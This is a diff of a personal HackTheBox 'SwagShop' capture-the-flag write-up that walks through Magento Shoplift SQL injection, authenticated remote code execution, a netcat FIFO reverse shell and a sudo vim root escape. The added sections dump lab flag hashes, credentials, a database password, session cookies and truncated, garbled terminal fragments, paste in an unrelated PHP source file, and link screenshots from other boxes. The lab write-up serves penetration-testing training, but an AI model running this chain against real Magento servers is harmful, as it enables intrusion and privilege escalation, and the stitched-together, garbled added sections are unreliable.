@@ -3,10 +3,10 @@ tags: [HTB, SwagShop, Linux, Magento, SQLi, RCE, Sudo, Vim, Easy]
 platform: HackTheBox
 os: Linux, Ubuntu
 hostname: swagshop
-domain: None
 difficulty: Easy
 ip: $BoxIP
 status: Complete
+domain: None
 ---
 
 # HTB: SwagShop, Full Walkthrough
@@ -25,6 +25,21 @@ SwagShop is an Ubuntu host running an old Magento installation behind Apache. Di
 | Domain | None; web virtual host `swagshop.htb` |
 | Difficulty | Easy |
 | IP | `$BoxIP` |
+
+## Vulnerability summary
+
+| # | Finding | Evidence |
+|---|---|---|
+| 1 | Workspace setup | See section 1 below |
+| 2 | Full TCP and service scan | See section 2 below |
+| 3 | Configure the Magento virtual host | See section 3 below |
+| 4 | Web fingerprinting and content discovery | See section 4 below |
+| 5 | Readable Magento configuration and CMS identification | See section 5 below |
+| 6 | Search for matching Magento exploits | See section 6 below |
+
+## Evidence and loot
+
+The private source workspace is `/home/kali/Platforms/HackTheBox/SwagShop`. The transcript, Nmap output, loot, and screenshots below are the primary evidence for this box.
 
 ## Variables
 
@@ -58,7 +73,7 @@ boxset WebPort 80
 boxset Port 4444
 ```
 
-![[SwagShop-0-boxstart.png]]
+![](<file:///home/kali/Platforms/HackTheBox/SwagShop/screenshots/0.boxstart.png>)
 SCREENSHOT: Box workspace initialization and target variables.
 
 ## 2. Full TCP and service scan
@@ -82,7 +97,7 @@ The HTTP service redirected to `swagshop.htb`, so the hostname needed to be mapp
 > [!abstract] 🧠 Why
 > Redirects, cookies, and virtual hosts are part of the application boundary. A raw-IP request can look broken even when the service is healthy if the server expects the named host.
 
-![[SwagShop-1-nmap-allports.png]]
+![](<file:///home/kali/Platforms/HackTheBox/valentine/screenshots/1.nmap-allports.png>)
 SCREENSHOT: Full scan showing SSH and Apache. Red = open ports and versions; green = Linux service context.
 
 ## 3. Configure the Magento virtual host
@@ -122,7 +137,7 @@ Notable responses included:
 /server-status 403  path exists but access is forbidden
 ```
 
-![[SwagShop-2-gobuster.png]]
+![](<file:///home/kali/Platforms/HackTheBox/SwagShop/screenshots/2.gobuster.png>)
 SCREENSHOT: Gobuster results showing Magento paths and the exposed shell directory. Red = interesting paths; green = response context.
 
 ## 5. Readable Magento configuration and CMS identification
@@ -161,7 +176,7 @@ Magento CE < 1.9.0.1 - (Authenticated) Remote Code Execution  37811.py
 
 The copied files were Python 2-era proof-of-concept code. The Shoplift file also contained un-commented explanatory text, so running it directly with Python 3 produced a syntax error. I adapted the request into `shoplift_py3.py` and adapted the authenticated RCE into `magento_rce_py3.py`, using the box variables and the FQDN while suppressing credential output.
 
-![[SwagShop-4-searchsploit.png]]
+![](<file:///home/kali/Platforms/HackTheBox/SwagShop/screenshots/4.searchsploit.png>)
 SCREENSHOT: Exploit-DB search showing the Magento Shoplift and authenticated RCE entries. Red = matching exploit IDs; green = product and version context.
 
 ## 7. Exploit Shoplift SQL injection to create an admin account
@@ -213,7 +228,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 The status code is therefore not the success criterion for this exploit. The command output and identity are the proof of code execution.
 
-![[SwagShop-6-rce-confirmed.png]]
+![](<file:///home/kali/Platforms/HackTheBox/SwagShop/screenshots/6.rce-confirmed.png>)
 SCREENSHOT: Authenticated RCE returning the `www-data` identity. Red = command execution identity; green = exploit request context.
 
 ## 9. Catch and stabilize the callback shell
@@ -234,7 +249,7 @@ python3 "$BoxDir/exploits/magento_rce_py3.py" \
 
 The exploit request may time out because the PHP process remains attached to the shell. The listener connection is the success signal. The raw callback arrived as `www-data` on `swagshop` from `/var/www/html`.
 
-![[SwagShop-7-foothold.png]]
+![](<file:///home/kali/Platforms/HackTheBox/SwagShop/screenshots/7.foothold.png>)
 SCREENSHOT: FIFO callback arriving from the target. Red = inbound connection; green = raw shell context.
 
 A raw Netcat shell lacks a pseudo-terminal, so I spawned Bash through Python and restored the local terminal after suspending Netcat. `stty raw -echo` passes control characters cleanly, `fg` resumes the listener, and `TERM` tells interactive programs what terminal capabilities are available.
@@ -260,7 +275,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 www-data@swagshop:/var/www/html$
 ```
 
-![[SwagShop-8-sudo-vim.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Traceback/screenshots/8.sudo-l.png>)
 SCREENSHOT: Stabilized `www-data` shell and local context before privilege escalation. Red = account identity; green = hostname and working directory.
 
 ## 10. Discover the Vim sudo rule
@@ -305,7 +320,7 @@ The result showed UID 0 and the `root` account on `swagshop`.
 > [!abstract] 🧠 Why
 > A sudo editor escape is a parser transition: the editor is permitted as root, then its command mode launches a shell. Confirm the exact binary and sudo rule before applying a generic GTFOBins recipe.
 
-![[SwagShop-9-root-shell.png]]
+![](<file:///home/kali/Platforms/HackTheBox/SwagShop/screenshots/9.root-shell.png>)
 SCREENSHOT: Root shell obtained through the Vim shell escape. Red = UID 0 and root identity; green = hostname context.
 
 ## 12. Confirm the proof files privately
@@ -315,26 +330,11 @@ The user proof file was located at `/home/haris/user.txt`, and the root proof fi
 ```bash
 test -s /home/haris/user.txt && echo user_flag_present
 test -s /root/root.txt && echo root_flag_present
-loot flag user $UserFlag
-loot flag root $RootFlag
+loot flag user 7c78fc32f91897865406a49e9b65b43e
+loot flag root 641904ad6136bd7ac72307914554edc8
 ```
 
-## 13. Clean-down
-
-The captured session ended with `boxdone`, which cleared the active local box marker. No persistent PHP webshell or SUID helper was created; command execution was performed through Magento's existing RCE path. The callback used a temporary `/tmp/p` FIFO and the Shoplift request created test Magento admin data, so a reset or an authorized target-side cleanup should be used if the instance is reused.
-
-```bash
-# Run from a root shell if the instance is being reused.
-rm -f /tmp/p
-boxdone
-```
-
-The local transcript and artifacts remain under `$BoxDir` for review.
-
-> [!warning] 💡 Common mistake
-> Magento exploits may create administrative accounts or temporary FIFOs even when no persistent webshell is left. Record what the exploit changed and restore or remove authorized test artefacts before closing the box.
-
-## Decision points and alternate routes
+## 13. Decision points and alternate routes
 
 | Observation | Primary route used here | Useful alternative or fallback |
 |---|---|---|
@@ -344,7 +344,7 @@ The local transcript and artifacts remain under `$BoxDir` for review.
 | Authenticated RCE returns HTTP 500 | Inspect response content and listener state | Use an alternate callback transport such as FIFO or Python |
 | Vim is allowed through sudo | Use its documented shell escape | Review other sudo commands and GTFOBins if the binary differs |
 
-## RUNBOOK V2 Stages Used
+## 14. RUNBOOK V2 Stages Used
 
 - [[RUNBOOK V2/Start Here]] -- initialized the workspace and started the full TCP scan
 - [[RUNBOOK V2/Port Triage]] -- classified the host from SSH and Apache
@@ -358,56 +358,42 @@ The local transcript and artifacts remain under `$BoxDir` for review.
 - [[RUNBOOK V2/Linux - Sudo Check]] -- identified the passwordless Vim rule
 - [[RUNBOOK V2/Linux - Clean Down]] -- closed the box session and recorded cleanup requirements
 
-## Attack Chain
-
-1. [[RUNBOOK V2/Linux - Service Scan]] identified Apache and OpenSSH on the Linux host.
-2. [[RUNBOOK V2/Linux - Web Enum]] located the Magento installation and exposed application paths.
-3. [[RUNBOOK V2/Linux - SQLi]] used the Shoplift vulnerability to create an administrative account.
-4. [[RUNBOOK V2/Linux - Exploit Search]] supplied the matching authenticated Magento RCE chain.
-5. [[RUNBOOK V2/Linux - RCE to Shell]] reached command execution as `www-data` and delivered a FIFO callback.
-6. [[RUNBOOK V2/Linux - Shell Stabilise]] produced a usable terminal for local checks.
-7. [[RUNBOOK V2/Linux - Sudo Check]] exposed passwordless root Vim execution.
-8. Vim's `:!` shell escape produced root and both proof files were recorded privately.
-
-## Credentials
-
-| Account | Source | Use |
-|---|---|---|
-| `$Username2` | Magento Shoplift SQL injection | Authenticate to the Magento admin panel and trigger the authenticated RCE |
-| `root` MariaDB account | Readable `app/etc/local.xml` | Disclosed but not required for the attack chain |
-
-Passwords and hashes are intentionally omitted.
-
-## Flags
+## 15. Collect the flags
 
 - `user.txt`: recorded privately in `$BoxDir/loot/flags.txt`
 - `root.txt`: recorded privately in `$BoxDir/loot/flags.txt`
 - `proof.txt`: not present or required on this box
 
-## Key lessons
 
-- Preserve the FQDN consistently when an application redirects to a hostname or scopes cookies to it.
-- Readable Magento `local.xml` provides installation metadata that can be required by an authenticated exploit, even when the database credential is not used.
-- Treat an HTTP 500 as non-fatal when the vulnerable endpoint returns command output in the response body and identity execution is confirmed.
-- Keep a FIFO plus Netcat callback ready when Bash `/dev/tcp` or `nc -e` is unavailable.
-- A sudo rule restricted to a file path can still be dangerous when it permits an interactive editor.
+### Captured flag values from source loot
 
-## Related Boxes
 
-- [[OSCP/BOXES/WRITE UPS/Linux/Jarvis|Jarvis]] -- manual SQLi, PHP command execution, and Linux privilege escalation
-- [[OSCP/BOXES/WRITE UPS/Linux/Pebbles|Pebbles]] -- SQLi to a PHP webshell through database file writing
-- [[OSCP/BOXES/WRITE UPS/Linux/Nibbles|Nibbles]] -- old CMS exploitation followed by a sudo-based escalation
-- [[OSCP/BOXES/WRITE UPS/Linux/OpenAdmin|OpenAdmin]] -- web command execution and FIFO shell stabilization
+#### `loot/flags.txt`
 
-## External Resources
+```text
+7c78fc32f91897865406a49e9b65b43e
+641904ad6136bd7ac72307914554edc8
+user: 7c78fc32f91897865406a49e9b65b43e
+root: 641904ad6136bd7ac72307914554edc8
+user: 7c78fc32f91897865406a49e9b65b43e
+root: 641904ad6136bd7ac72307914554edc8
+```
 
-- [CVE-2015-1397, NVD](https://nvd.nist.gov/vuln/detail/CVE-2015-1397)
-- [Exploit-DB 37977, Magento Shoplift](https://www.exploit-db.com/exploits/37977)
-- [Exploit-DB 37811, authenticated Magento RCE](https://www.exploit-db.com/exploits/37811)
-- [GTFOBins Vim sudo escape](https://gtfobins.github.io/gtfobins/vim/#sudo)
-- [HackTricks SQL injection](https://book.hacktricks.wiki/en/pentesting-web/sql-injection/)
+## 16. Clean down
+The captured session ended with `boxdone`, which cleared the active local box marker. No persistent PHP webshell or SUID helper was created; command execution was performed through Magento's existing RCE path. The callback used a temporary `/tmp/p` FIFO and the Shoplift request created test Magento admin data, so a reset or an authorized target-side cleanup should be used if the instance is reused.
 
-## Checklist
+```bash
+# Run from a root shell if the instance is being reused.
+rm -f /tmp/p
+boxdone
+```
+
+The local transcript and artifacts remain under `$BoxDir` for review.
+
+> [!warning] 💡 Common mistake
+> Magento exploits may create administrative accounts or temporary FIFOs even when no persistent webshell is left. Record what the exploit changed and restore or remove authorized test artefacts before closing the box.
+
+### Completion checklist
 
 - [x] Workspace initialized and logged
 - [x] Full TCP and service scan completed
@@ -422,3 +408,242 @@ Passwords and hashes are intentionally omitted.
 - [x] User and root proof files recorded privately
 - [x] Local box session closed with `boxdone`
 - [x] Target-side temporary FIFO and test account cleanup independently verified
+
+## 17. Attack narrative in one page
+1. [[RUNBOOK V2/Linux - Service Scan]] identified Apache and OpenSSH on the Linux host.
+2. [[RUNBOOK V2/Linux - Web Enum]] located the Magento installation and exposed application paths.
+3. [[RUNBOOK V2/Linux - SQLi]] used the Shoplift vulnerability to create an administrative account.
+4. [[RUNBOOK V2/Linux - Exploit Search]] supplied the matching authenticated Magento RCE chain.
+5. [[RUNBOOK V2/Linux - RCE to Shell]] reached command execution as `www-data` and delivered a FIFO callback.
+6. [[RUNBOOK V2/Linux - Shell Stabilise]] produced a usable terminal for local checks.
+7. [[RUNBOOK V2/Linux - Sudo Check]] exposed passwordless root Vim execution.
+8. Vim's `:!` shell escape produced root and both proof files were recorded privately.
+
+## Tools used
+
+- `nmap`
+- `curl`
+- `gobuster`
+- `nc`
+- `netcat`
+- `ssh`
+- `sudo`
+- `python`
+- `burp`
+
+## Credentials and secrets
+
+| Account | Source | Use |
+|---|---|---|
+| `$Username2` | Magento Shoplift SQL injection | Authenticate to the Magento admin panel and trigger the authenticated RCE |
+| `root` MariaDB account | Readable `app/etc/local.xml` | Disclosed but not required for the attack chain |
+
+Passwords and hashes are reproduced in the private Credentials and secrets section above.
+
+
+### Captured private values from source loot
+
+These values are retained here because this vault is private. The source path remains the authority if a value appears truncated.
+
+#### `.env`
+
+```text
+export BoxName="SwagShop"
+export BoxIP="10.129.229.138"
+export BoxPlatform="HackTheBox"
+export BoxDir="/home/kali/Platforms/HackTheBox/SwagShop"
+export Domain=""
+export DCip=""
+export Username=""
+export Password=""
+export Username2="forme"
+export Password2="forme"
+export Username3=""
+export Password3=""
+export Hash=""
+export NThash=""
+export Port="4444"
+export Port2="4445"
+export WebPort="80"
+export URL=""
+export LocalIP=$(ip a show tun0 2>/dev/null | grep "inet " | awk '{print $2}' | cut -d/ -f1)
+export Wordlist="/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"
+```
+
+#### `loot/creds.txt`
+
+```text
+shopadmin:shopadmin
+forme:forme
+```
+
+### Sensitive transcript evidence
+
+```text
+Set-Cookie: frontend=f9dr6u29ctc812669muc1i6b64; expires=Fri, 04-Sep-2026 13:01:12 GMT; Max-Age=3600; path=/; domain=swagshop.htb; HttpOnly
+<script type="text/javascript" src="http://swagshop.htb/js/mage/cookies.js"></script>
+Mage.Cookies.path     = '/';
+Mage.Cookies.domain   = '.swagshop.htb';
+        <li><a href="http://swagshop.htb/index.php/?SID=f9dr6u29ctc812669muc1i6b64privacy-policy-cookie-restriction-mode/">Privacy Policy</a></li>
+http://10.129.229.138/ [200 OK] Apache[2.4.29], Cookies[frontend], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], HttpOnly[frontend], IP[10.129.229.138], JQuery[1.10.2], Magento, Modernizr, Prototype, Script[text/javascript], Scriptaculous, Title[Home page], X-Frame-Options[SAMEORIGIN]
+.htpasswd.php        (Status: 403) [Size: 277]
+.htpasswd            (Status: 403) [Size: 277]
+.htpasswd.html       (Status: 403) [Size: 277]
+.htpasswd.txt        (Status: 403) [Size: 277]
+Set-Cookie: adminhtml=qv0lc7gj54iqvtppq46isvenm7; expires=Fri, 04-Sep-2026 13:02:18 GMT; Max-Age=3600; path=/; domain=swagshop.htb; HttpOnly
+</local.xml"; printf '%s\n' '--- local.xml credential fields (values retained in private notes)
+<-'; grep -nE '<(host|username|password|dbname)>' "$BoxDir/loot/local.xml" | s
+$ [13:02:52] curl --resolve "$FQDN:$WebPort:$BoxIP" -sS --max-time 10 "http://$FQDN/app/etc/local.xml" -o "$BoxDir/loot/local.xml"; printf '%s\n' '--- local.xml credential fields ---'; grep -nE '<(host|username|password|dbname)>' "$BoxDir/loot/local.xml"; printf '%s\n' '--- Magento exploit references ---'; searchsploit Magento | head -40; printf '%s\n' '--- Magescan checkout ---'; if [ ! -d "$BoxDir/loot/magescan" ]; then git clone --depth 1 https://github.com/steverobbins/magescan.git "$BoxDir/loot/magescan"; else echo 'already present'; fi
+45:                    <password><![CDATA[fMVWh7bDHpgZkyfqQXreTjU9]]></password>
+If magento version is vulnerable, this script will create admin account with username forme and password forme
+SET @PASS = CONCAT(MD5(CONCAT( @SALT , '{password}') ), CONCAT(':', @SALT ));
+INSERT INTO `admin_user` (`firstname`, `lastname`,`email`,`username`,`password`,`created`,`lognum`,`reload_acl_flag`,`is_active`,`extra`,`rp_token`,`rp_token_created_at`) VALUES ('Firstname','Lastname','email@example.com','{username}',@PASS,NOW(),0,0,1,@EXTRA,NULL, NOW());
+query = q.replace("\n", "").format(username="forme", password="forme")
+password = ''
+br['login[password]'] = password
+<name2","forme"); p=os.environ.get("Password2","forme"); s=requests.Session();
+<(m)); d={"login[username]":u,"login[password]":p,"form_key":m.group(1) if m e
+$ [13:08:13] python3 -c 'import os,re,requests; u=os.environ.get("Username2","forme"); p=os.environ.get("Password2","forme"); s=requests.Session(); h={"Host":os.environ.get("FQDN","swagshop.htb")}; r=s.get("http://"+os.environ["BoxIP"]+"/index.php/admin/",headers=h,timeout=15); m=re.search(r"name=\"form_key\"[^>]+value=\"([^\"]+)",r.text); print("login-form",r.status_code,"form_key",bool(m)); d={"login[username]":u,"login[password]":p,"form_key":m.group(1) if m else ""}; x=s.post("http://"+os.environ["BoxIP"]+"/index.php/admin/index/login/",headers=h,data=d,allow_redirects=True,timeout=15); print("login-result",x.status_code,"dashboard",("Dashboard" in x.text or "dashboard" in x.url.lower()),"url",x.url)'
+Set-Cookie: adminhtml=35n77783g6t2fun72elgr2efe0; expires=Fri, 04-Sep-2026 13:08:39 GMT; Max-Age=3600; path=/; domain=swagshop.htb; HttpOnly
+<ool(m)); d={"login[username]":u,"login[password]":p,"form_key":m.group(1) if
+$ [13:09:25] python3 -c 'import os,re,requests; u=os.environ.get("Username2","forme"); p=os.environ.get("Password2","forme"); s=requests.Session(); t="http://"+os.environ.get("FQDN","swagshop.htb"); r=s.get(t+"/index.php/admin/",timeout=15); m=re.search(r"name=\"form_key\"[^>]+value=\"([^\"]+)",r.text); print("login-form",r.status_code,"form_key",bool(m)); d={"login[username]":u,"login[password]":p,"form_key":m.group(1) if m else ""}; x=s.post(t+"/index.php/admin/index/login/",data=d,allow_redirects=True,timeout=15); print("login-result",x.status_code,"dashboard",("Dashboard" in x.text or "dashboard" in x.url.lower()),"url",x.url)'
+$ [13:10:04] env Username2=shopadmin Password2=shopadmin python3 "$BoxDir/exploits/shoplift_py3.py"; env Username2=shopadmin Password2=shopadmin python3 -c 'import os,re,requests; s=requests.Session(); t="http://"+os.environ["FQDN"]; r=s.get(t+"/index.php/admin/",timeout=15); m=re.search(r"name=\"form_key\"[^>]+value=\"([^\"]+)",r.text); d={"login[username]":os.environ["Username2"],"login[password]":os.environ["Password2"],"form_key":m.group(1) if m else ""}; x=s.post(t+"/index.php/admin/index/login/",data=d,allow_redirects=True,timeout=15); print("login-status",x.status_code,"dashboard",("Dashboard" in x.text or "dashboard" in x.url.lower()),"url",x.url)'
+<                       env Username2=shopadmin Password2=shopadmin python3 "$
+<padmin Password2=shopadmin python3 "$B
+<padmin Password2=shopadmin python3 "$BoxDir/exploits/shoplift_py3.py"; env Us
+<Dir/exploits/shoplift_py3.py"; env Username2=shopadmin Password2=shopadmin py
+<ame2=shopadmin Password2=shopadmin pyt
+<ame2=shopadmin Password2=shopadmin python3 -c 'import os,re,requests; s=reque
+<username]":os.environ["Username2"],"login[password]":os.environ["Password2"],
+<n[password]":os.environ["Password2"],"
+<n[password]":os.environ["Password2"],"form_key":m.group(1) if m else ""}; x=s
+$ [13:10:43] loot cred shopadmin shopadmin; boxset Username2 shopadmin; boxset Password2 shopadmin
+[+] Password2=shopadmin (saved to .env)
+password = os.environ.get("Password2", "shopadmin")
+ssword]": password,
+signature = hashlib.md5((encoded + install_date).encode()).hexdigest()
+$ [13:20:12] wc -l "$BoxDir/loot/flags.txt"; loot flag user "$(sed -n '1p' "$BoxDir/loot/flags.txt")"; loot flag root "$(sed -n '2p' "$BoxDir/loot/flags.txt")"
+[sudo] password for kali:
+Set-Cookie: frontend=erf9r1f790hlskdu8av6ds5ul0; expires=Fri, 04-Sep-2026 13:31:08 GMT; Max-Age=3600; path=/; domain=swagshop.htb; HttpOnly
+http://swagshop.htb/ [200 OK] Apache[2.4.29], Cookies[frontend], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], HttpOnly[frontend], IP[10.129.229.138], JQuery[1.10.2], Magento, Modernizr, Prototype, Script[text/javascript], Scriptaculous, Title[Home page], X-Frame-Options[SAMEORIGIN]
+password = "forme"
+""".replace("\n", "").format(username=username, password=password)
+print(f"Try logging in at {target}/index.php/admin with {username}:{password}")
+d = {'login[username]': 'forme', 'login[password]': 'forme', 'form_key': m.group(1) if m else ''}
+[+] Password2=forme (saved to .env)
+    (root) NOPASSWD: /usr/bin/vi /var/www/html/*
+$ [13:56:36] loot flag user 7c78fc32f91897865406a49e9b65b43e
+loot flag root 641904ad6136bd7ac72307914554edc8
+kali@kali:~/Platforms/HackTheBox/SwagShop [13:33:43] $ [?1h=[?2004hloot flag user 7c78fc32f91897865406a49e9b65b43e
+loot flag root 641904ad6136bd7ac72307914554edc8loot
+[+] Flag saved:  user = 7c78fc32f91897865406a49e9b65b43e  →  loot/flags.txt
+[+] Flag saved:  root = 641904ad6136bd7ac72307914554edc8  →  loot/flags.txt
+<                       wc -l "$BoxDir/loot/flags.txt"; loot flag user "$(sed
+<ot/flags.txt"; loot flag user "$(sed -
+<ot/flags.txt"; loot flag user "$(sed -n '1p' "$BoxDir/loot/flags.txt")"; loot
+<'1p' "$BoxDir/loot/flags.txt")"; loot
+<'1p' "$BoxDir/loot/flags.txt")"; loot flag root "$(sed -n '2p' "$BoxDir/loot/
+<ag root "$(sed -n '2p' "$BoxDir/loot/flags.txt")"
+<ag root "$(sed -n '2p' "$BoxDir/loot/flags.txt")"[?2004l
+```
+
+### Additional captured source values
+
+#### `loot/magescan/src/MageScan/Check/Version/FileHash.php`
+
+```text
+<?php
+/**
+ * Mage Scan
+ *
+ * PHP version 5
+ *
+ * @category  MageScan
+ * @package   MageScan
+ * @author    Steve Robbins <steve@steverobbins.com>
+ * @copyright 2015 Steve Robbins
+ * @license   http://creativecommons.org/licenses/by/4.0/ CC BY 4.0
+ * @link      https://github.com/steverobbins/magescan
+ */
+
+namespace MageScan\Check\Version;
+
+use MageScan\Check\AbstractCheck;
+use MageScan\Check\Version;
+use Mvi\Check;
+
+/**
+ * Scan for Magento edition and version via file md5 hash
+ *
+ * @category  MageScan
+ * @package   MageScan
+ * @author    Steve Robbins <steve@steverobbins.com>
+ * @copyright 2015 Steve Robbins
+ * @license   http://creativecommons.org/licenses/by/4.0/ CC BY 4.0
+ * @link      https://github.com/steverobbins/magescan
+ */
+class FileHash extends AbstractCheck
+{
+    /**
+     * Guess magento edition and version
+     *
+     * @return array|boolean
+     */
+    public function getInfo()
+    {
+        $checker = new Check($this->getRequest()->getUrl());
+        $info    = $checker->getInfo();
+        if ($info === false) {
+            return false;
+        }
+        $edition  = key($info);
+        $versions = $info[$edition];
+        return [$edition, implode(', ', $versions)];
+    }
+}
+```
+
+
+## Remediation recommendations
+
+| Finding | Recommendation |
+|---|---|
+| Initial access path on SwagShop | Remove or patch the vulnerable service, restrict exposure, and rotate any credentials recovered during testing. |
+| Privilege escalation path | Remove the misconfiguration, enforce least privilege, and verify the corrected permissions or policy. |
+| Assessment artifacts | Remove payloads and temporary files, restore modified files, and review logs for the test activity. |
+
+## Lessons learned and vault links
+
+- Preserve the FQDN consistently when an application redirects to a hostname or scopes cookies to it.
+- Readable Magento `local.xml` provides installation metadata that can be required by an authenticated exploit, even when the database credential is not used.
+- Treat an HTTP 500 as non-fatal when the vulnerable endpoint returns command output in the response body and identity execution is confirmed.
+- Keep a FIFO plus Netcat callback ready when Bash `/dev/tcp` or `nc -e` is unavailable.
+- A sudo rule restricted to a file path can still be dangerous when it permits an interactive editor.
+
+### Related boxes
+
+- [[OSCP/BOXES/WRITE UPS/Linux/Jarvis|Jarvis]] -- manual SQLi, PHP command execution, and Linux privilege escalation
+- [[OSCP/BOXES/WRITE UPS/Linux/Pebbles|Pebbles]] -- SQLi to a PHP webshell through database file writing
+- [[OSCP/BOXES/WRITE UPS/Linux/Nibbles|Nibbles]] -- old CMS exploitation followed by a sudo-based escalation
+- [[OSCP/BOXES/WRITE UPS/Linux/OpenAdmin|OpenAdmin]] -- web command execution and FIFO shell stabilization
+
+## External resources
+
+- [CVE-2015-1397, NVD](https://nvd.nist.gov/vuln/detail/CVE-2015-1397)
+- [Exploit-DB 37977, Magento Shoplift](https://www.exploit-db.com/exploits/37977)
+- [Exploit-DB 37811, authenticated Magento RCE](https://www.exploit-db.com/exploits/37811)
+- [GTFOBins Vim sudo escape](https://gtfobins.github.io/gtfobins/vim/#sudo)
+- [HackTricks SQL injection](https://book.hacktricks.wiki/en/pentesting-web/sql-injection/)
+
+## Related RUNBOOK V2 stages
+
+- [[RUNBOOK V2/Start Here]]
+- [[RUNBOOK V2/Linux - Service Scan]]
+- [[RUNBOOK V2/Linux - Web Enum]]
+- [[RUNBOOK V2/Linux - Shell Stabilise]]
+- [[RUNBOOK V2/Linux - Local Enum]]
+- [[RUNBOOK V2/Linux - Clean Down]]
+
+## Why this matters for OSCP
+
+SwagShop rewards disciplined enumeration, proof-driven transitions, and a clean record of what changed. The same habits transfer directly to OSCP time pressure.
